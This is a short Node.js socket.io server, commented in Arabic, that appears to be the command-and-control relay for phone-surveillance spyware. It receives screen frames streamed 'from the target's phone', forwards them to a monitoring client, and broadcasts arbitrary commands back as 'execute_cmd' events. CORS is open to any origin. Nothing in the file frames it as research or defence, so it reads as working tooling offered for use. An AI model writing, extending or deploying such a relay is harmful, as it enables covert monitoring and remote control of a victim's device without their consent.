const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" } // للسماح بالاتصال من أي مكان
});
const path = require('path');

app.use(express.static(path.join(__dirname, 'public')));

// عند فتح الرابط الرئيسي، يتم عرض ملف index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

io.on('connection', (socket) => {
    console.log('✅ متصل');

    // استقبال البث من هاتف الهدف
    socket.on('screen_frame', (data) => {
        socket.broadcast.emit('update_monitor', data);
    });

    // استقبال الأوامر (اختياري)
    socket.on('command', (cmd) => {
        socket.broadcast.emit('execute_cmd', cmd);
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => {
    console.log(`🚀 السيرفر شغال على المنفذ ${PORT}`);
});
